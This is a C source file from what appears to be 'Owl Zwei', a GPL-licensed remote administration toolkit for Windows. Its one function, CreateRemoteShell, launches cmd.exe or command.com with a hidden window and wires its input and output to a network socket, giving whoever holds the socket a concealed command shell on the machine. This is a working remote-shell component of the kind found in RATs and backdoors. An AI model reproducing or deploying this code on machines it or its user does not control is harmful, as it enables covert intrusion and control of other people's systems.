/* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * 
 *   Owl Zwei - Remote Administration Toolkit For Windows                    *
 *                                                                           * 
 *   Copyright 2010 Yati Sagade                                              *
 *                                                                           *
 *   This file is part of Owl Zwei.                                          *
 *                                                                           *
 *   Owl Zwei is free software: you can redistribute it and/or modify        *
 *   it under the terms of the GNU General Public License as published by    *
 *   the Free Software Foundation, either version 3 of the License, or       *
 *   (at your option) any later version.                                     *
 *                                                                           *
 *   Owl Zwei is distributed in the hope that it will be useful,             *
 *   but WITHOUT ANY WARRANTY; without even the implied warranty of          *
 *   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the           *
 *   GNU General Public License for more details.                            *
 *                                                                           *
 *   You should have received a copy of the GNU General Public License       *
 *   along with Owl Zwei.  If not, see <http://www.gnu.org/licenses/>.       *
 *                                                                           *
 * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * */
#include "shell.h"

void CreateRemoteShell( SOCKET s ){

	char *wdir = windir();
	char *sdir = sysdir();
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	char spath[256];
	
	if( is_NT() )
		wsprintf( spath , "%s\\%s" , sdir , "cmd" );
	else
		wsprintf( spath , "%s\\%s" , wdir , "command.com" );

	memset( &si , 0 , sizeof(si) );
	memset( &pi , 0 , sizeof(pi) );

	si.cb = sizeof(STARTUPINFO);
	si.dwFlags = STARTF_USESTDHANDLES + STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_HIDE;
	si.hStdInput = (void*)s;
	si.hStdError = (void*)s;
	si.hStdOutput =(void*)s;

	if (CreateProcess(NULL, spath, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)){
			WaitForSingleObject(pi.hProcess, INFINITE);
			CloseHandle(pi.hThread);
			CloseHandle(pi.hProcess);
	}

}
